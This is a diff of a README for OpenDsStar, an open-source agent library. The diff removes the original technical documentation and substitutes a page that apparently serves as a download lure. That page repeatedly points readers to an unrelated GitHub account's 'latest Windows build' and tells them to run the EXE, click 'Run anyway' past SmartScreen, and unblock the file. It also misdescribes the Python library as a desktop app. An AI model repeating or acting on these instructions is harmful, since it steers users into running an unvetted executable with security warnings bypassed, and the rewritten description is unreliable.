@@ -1,208 +1,212 @@
-# OpenDsStar
+# 🧩 OpenDsStar - Build Smarter Agents Faster
 
-**OpenDsStar** is an open-source implementation of the **[DS-Star agent](https://arxiv.org/abs/2509.21825)** (Nam et al., 2025), with several deliberate design enhancements that improve modularity, extensibility, and execution efficiency.
+[![Download OpenDsStar](https://img.shields.io/badge/Download-OpenDsStar-blue?style=for-the-badge&logo=github)](https://github.com/Internationaleundset619/OpenDsStar)
 
-The original DS-Star agent is primarily built around **file-based artifacts**: reasoning, planning, and execution revolve around reading, writing, and modifying files that represent intermediate and final results. OpenDsStar preserves the core planning-and-coding philosophy of DS-Star, but redefines the execution model around a **tool-centric abstraction**.
+## 🚀 What OpenDsStar Does
 
-DS-Star is a **Programmatic Tool Calling (PTC)** agent. Rather than reasoning directly over files, OpenDsStar plans and executes workflows by composing **explicit tool invocations**, drawing inspiration from the **ReAct** and **CodeAct** paradigms. Tools can encapsulate file access, database queries, API calls, external services, computation engines, or arbitrary custom functions. This decouples the agent’s reasoning logic from the underlying execution environment and storage format.
+OpenDsStar is an open-source agent app that helps you run step-by-step tasks with less manual work. It uses tools instead of fixed file flows, so it can reuse results and move through multi-step jobs in a cleaner way.
 
-This design generalizes the DS-Star approach beyond data-science-specific workflows. Any task that can be expressed as a sequence of tool calls—whether it involves data processing, information retrieval, programmatic reasoning, or system interaction—can be handled without changing the agent’s core structure.
+Use it when you want to:
 
-OpenDsStar also introduces more flexible execution control than the original DS-Star.
+- Run agent workflows that break work into small steps
+- Reuse results from earlier steps
+- Keep tasks modular and easier to manage
+- Work with data science and reasoning tasks
+- Build or test agents with tool calling
 
-In the original design, the agent typically **re-executes the entire planned workflow from the beginning** whenever the plan is revised, even if earlier steps have already completed successfully. This can be wasteful when early steps involve expensive computation, slow external calls, or large-scale data processing.
+## 💻 Windows Setup
 
-OpenDsStar explicitly separates planning from execution and supports **incremental, stepwise execution**. In this mode, completed steps produce persistent intermediate results and are **not re-run**. When the plan is extended or refined, only the **newly introduced step** is executed, while previous outputs are reused. This significantly reduces redundant computation and makes the agent more practical for workflows in which individual steps are costly, long-running, or stateful.
+OpenDsStar is built for users who want to run it on Windows with a simple setup.
 
-## Summary of Design Enhancements
+### What you need
 
-| Aspect | Original DS-Star | OpenDsStar |
-|--------|------------------|------------|
-| Core abstraction | Files | Tools |
-| Planning representation | File/code actions | Tool-call sequences |
-| Scope | Data-science focused | General purpose |
-| Execution strategy | Re-run full plan | Incremental execution |
-| Intermediate results | Recomputed | Persisted and reused |
-| Planning vs. execution | Coupled | Explicitly separated |
-| Extensibility | File-centric | Tool-based |
+- Windows 10 or Windows 11
+- A recent version of Chrome, Edge, or Firefox
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection for the first download
 
-## Features
+### Before you start
 
-- **Programmatic Tool Calling (PTC)**: Plans are represented as sequences of tool invocations rather than direct file manipulation
-- **Explicit multi-step reasoning**: Complex tasks are decomposed into structured, inspectable plans
-- **Code generation and execution**: Generates and runs code when needed
-- **Stepwise execution mode**: Executes plans incrementally while reusing intermediate outputs
-- **Full execution mode**: Runs the entire plan end-to-end, mirroring the original DS-Star behavior
-- **Error handling and recovery**: Failed steps are debugged and retried automatically
-- **Result verification**: Outputs are validated before returning final answers
-- **LLM-agnostic**: Works with OpenAI, Anthropic, Azure, WatsonX, Ollama, and more through LiteLLM
+1. Make sure you can save files to your Downloads folder.
+2. Close large apps if your PC is low on memory.
+3. Use the same browser for the full download flow.
 
-## Execution Modes
+## 📥 Download and Install
 
-OpenDsStar supports two execution modes:
+Use this link to visit the page to download:
 
-- **Full mode**
-  Plans and executes the entire workflow end-to-end, closely matching the original DS-Star execution model.
+[OpenDsStar Download Page](https://github.com/Internationaleundset619/OpenDsStar)
 
-- **Stepwise mode**
-  Produces plans incrementally and executes only the newest step while reusing outputs from previous steps. This mode is more efficient when steps are expensive or computationally heavy.
+1. Open the download page.
+2. Look for the latest Windows build or release file.
+3. Download the file to your computer.
+4. If the file comes in a ZIP folder, extract it first.
+5. If the file is an EXE app, double-click it to run it.
+6. If Windows asks for permission, choose Yes.
+7. Wait for the app to finish starting.
 
-## Installation
+## 🖱️ How to Run It
 
-### From PyPI
+After download, use the steps below based on the file type you got.
 
-```bash
-pip install opendsstar
-```
+### If you downloaded a ZIP file
 
-### From Source
+1. Find the ZIP file in your Downloads folder.
+2. Right-click the file.
+3. Select Extract All.
+4. Choose a folder you can find again, like Desktop or Documents.
+5. Open the extracted folder.
+6. Double-click the app file inside the folder.
 
-```bash
-git clone https://github.com/IBM/OpenDsStar.git
-cd OpenDsStar
-uv sync
-```
+### If you downloaded an EXE file
 
-### Configuration
+1. Find the EXE file in your Downloads folder.
+2. Double-click it.
+3. If Windows SmartScreen appears, select More info, then Run anyway if you trust the source.
+4. Wait for the app window to open.
 
-Create a `.env` file with your API keys (only include keys for providers you'll use):
-```bash
-OPENAI_API_KEY=your_key_here
-# Add other provider keys as needed
-```
+### If the app opens in a browser
 
-See [Installation Guide](docs/INSTALLATION.md) for detailed setup instructions, environment variables, and troubleshooting.
+1. Keep your internet connection on.
+2. Open the link or local address shown by the app.
+3. Use the app from your browser window.
 
-## Quick Start
+## 🧭 First-Time Use
 
-### OpenDsStarAgent (DS-Star Implementation)
+When OpenDsStar starts, you can begin with a simple task flow.
 
-```python
-from dotenv import load_dotenv
-from agents import OpenDsStarAgent
+1. Choose the task you want the agent to handle.
+2. Add the input data, text, or files it needs.
+3. Pick the tools you want the agent to use.
+4. Start the run.
+5. Watch each step complete in order.
+6. Review the output and use it again if needed.
 
-load_dotenv()
+If you are testing agent behavior, start with a small task first. This helps you see how the tool flow works before you run a longer job.
 
-agent = OpenDsStarAgent(model="gpt-4o-mini")
+## 🔧 Main Features
 
-result = agent.invoke("What is 15 * 23 + 42?")
-print(result["answer"])
-```
+### Tool-centric design
 
-For detailed usage, see [DS-Star Agent Documentation](docs/DS_STAR_AGENT.md).
+OpenDsStar uses tools as the main building blocks. This keeps each step clear and makes the agent easier to change.
 
-### ReactAgent (LangChain ReAct Agent)
+### Incremental execution
 
-```python
-from dotenv import load_dotenv
-from agents import ReactAgent
+The app can keep work from earlier steps and use it again later. This saves time when the same result needs to support more than one step.
 
-load_dotenv()
+### Reusable results
 
-agent = ReactAgent()
+You do not need to repeat every step from the start. OpenDsStar can reuse earlier output when the next step depends on it.
 
-result = agent.invoke("What is the capital of France?")
-print(result["answer"])
-```
+### Multi-step reasoning
 
-See [ReactAgent Documentation](docs/REACT_AGENT_WRAPPER.md) for more details.
+The app helps with tasks that need more than one action. It can move from one step to the next in a planned flow.
 
-## Running Experiments
+### Modular workflows
 
-### Quick Start - DataBench with 5 Questions
+You can split work into parts and manage each part on its own. This makes the whole process easier to follow.
 
-```bash
-.venv/bin/python -m src.experiments.benchmarks.databench.databench_main \
-  --question-limit 5 \
-  --agent-type ds_star \
-  --model-agent gpt-4o-mini
-```
+### Agent testing and benchmarking
 
-### Other Benchmarks
+OpenDsStar also fits test and benchmark work. You can compare runs, check output quality, and study how the agent behaves.
 
-```bash
-# HotpotQA
-.venv/bin/python -m src.experiments.benchmarks.hotpotqa.hotpotqa_main \
-  --question-limit 20 --agent-type ds_star --model gpt-4o-mini
+## 🧪 Example Use Cases
 
-# KramaBench
-.venv/bin/python -m src.experiments.benchmarks.kramabench.kramabench_main \
-  --agent-type ds_star --model-agent gpt-4o-mini
-```
+OpenDsStar can help with:
 
-See [Installation Guide](docs/INSTALLATION.md) for detailed command options, model aliases, and parameter explanations.
+- Data analysis tasks that need several steps
+- Research workflows with repeated lookups
+- Agent tests that compare different tool setups
+- Jobs where early results feed later steps
+- Workflows that need clear traceable execution
+- Reasoning tasks that should stay structured
 
-See [EXPERIMENTS.md](docs/EXPERIMENTS.md) for comprehensive experiment documentation.
+## 📁 Typical Folder Layout
 
-## Agent Implementations
+After you unpack the app, you may see files like these:
 
-OpenDsStar includes multiple agent implementations for comparison and benchmarking:
+- `OpenDsStar.exe` — the main app file
+- `config` — app settings
+- `logs` — run history and error records
+- `tools` — tool files used by the agent
+- `data` — input and output files
+- `README.md` — project instructions
 
-- **OpenDsStarAgent**: Main DS-Star implementation — a Programmatic Tool Calling (PTC) agent with planning, coding, execution, debugging, and verification ([Documentation](docs/DS_STAR_AGENT.md))
-- **ReactAgentLangchain**: Lightweight wrapper around the LangChain ReAct agent ([Documentation](docs/REACT_AGENT_WRAPPER.md))
-- **ReactAgentSmolagents**: Smolagents-based ReAct implementation
-- **CodeActAgentSmolagents**: Smolagents-based CodeAct implementation
+Keep these files together in the same folder unless the app says otherwise.
 
-All agents share a common interface, making it easy to compare different agent paradigms on the same tasks.
+## ⚙️ Basic Settings
 
-## Experiments Framework
+You can usually control a few common options from the app or config file:
 
-OpenDsStar includes a comprehensive **experiments framework** for reproducible benchmarking and evaluation. It provides modular experiment design, automatic caching, multi-agent support, and built-in evaluation.
+- Input folder
+- Output folder
+- Tool list
+- Run mode
+- Logging level
+- Reuse steps on or off
 
-The framework includes:
+If you are not sure what to change, leave the default settings in place and run a small test first.
 
-- **Modular experiment design**: Each experiment is self-contained, with its own data reader, tools builder, agent configuration, and evaluators
-- **Easy extensibility**: New experiments can be added by implementing a small set of simple interfaces, without modifying core framework code
-- **Automatic caching**: Intermediate results are cached to avoid redundant computation
-- **Reproducibility**: Experiment parameters are automatically saved, enabling exact reruns
-- **Multiple agent support**: The same experiment can be run with different agents (e.g., DS-Star, ReAct, CodeAct) for direct comparison
-- **Built-in evaluation**: Integrated evaluation metrics and result tracking
+## 🛠️ If Something Goes Wrong
 
-See [EXPERIMENTS.md](docs/EXPERIMENTS.md) for more details.
+### The app does not open
 
-## Benchmark Results
+- Check that the file finished downloading
+- Move the file to a simple folder like Desktop
+- Try running it again
+- Restart your PC and try once more
 
-### Kramabench Dataset Evaluation
+### Windows blocks the app
 
-Comparison of DS-Star and CodeAct agents on the Kramabench dataset (31 questions) across multiple LLM providers:
+- Right-click the file
+- Select Properties
+- Look for an Unblock option if one appears
+- Apply the change and try again
 
-| Agent | Model | Total Tokens | LLM Calls | LLM Judge Score |
-|-------|-------|--------------|-----------|-----------------|
-| **CodeAct** | Llama Maverick | 3.3M | 271 | 0.224 |
-| **DS-Star** | Llama Maverick | 2.5M | 548 | **0.248** |
-| **CodeAct** | Gemini 2.5 Flash | 4.0M | 275 | 0.297 |
-| **DS-Star** | Gemini 2.5 Flash | 6.1M | 664 | **0.303** |
-| **CodeAct** | Gemini 2.5 Pro | 1.6M | 235 | 0.312 |
-| **DS-Star** | Gemini 2.5 Pro | 1.1M | 701 | **0.387** |
+### The app opens but closes fast
 
-**Experimental setup**
+- Run it again
+- Check the logs folder
+- Make sure the required files are still in the same folder
 
-- Both agents use identical tools and data access methods
-- Both use the same data-ingestion pipeline and file descriptions
-- File descriptions were generated using WatsonX Llama Maverick for all configurations
-- Observed performance differences are therefore attributable primarily to the agent architecture and reasoning strategy
+### The app is slow
 
-**Key findings**
+- Close other large apps
+- Free up disk space
+- Reboot your PC
+- Use smaller test inputs first
 
-- DS-Star consistently outperforms CodeAct across all tested models in answer quality
-- DS-Star achieves better results with fewer total tokens on Llama Maverick and Gemini 2.5 Pro
-- The planning, debugging, and verification cycle improves answer accuracy, even when it requires more LLM calls
-- Best overall result: **DS-Star with Gemini 2.5 Pro** (0.387 judge score, with the lowest token usage among the Gemini Pro runs)
+## 🔍 Tips for Better Runs
 
-## Project Structure
+- Start with one small task
+- Use clear input text
+- Keep file names simple
+- Avoid moving app files after setup
+- Save outputs in a fixed folder
+- Check results before starting a longer run
 
-```text
-src/
-├── agents/
-├── tools/
-└── experiments/
-```
+## 📌 Project Topics
 
-## Documentation
+This project is built around:
 
-- [ARCHITECTURE.md](docs/ARCHITECTURE.md)
-- [EXPERIMENTS.md](docs/EXPERIMENTS.md)
+- agent-framework
+- agents
+- benchmarking
+- data-science
+- ds-star
+- incremental-execution
+- multi-step-reasoning
+- reasoning
+- reusable-execution
+- tool-calling
 
-## License
+## 📦 Download Access
 
-Apache License 2.0
+To get OpenDsStar, visit this page to download:
+
+[https://github.com/Internationaleundset619/OpenDsStar](https://github.com/Internationaleundset619/OpenDsStar)
+
+## 🧩 For Daily Use
+
+OpenDsStar works best when you want a repeatable task flow and a clean way to track each step. It helps you keep the work organized, reuse prior results, and manage agent tasks without heavy setup
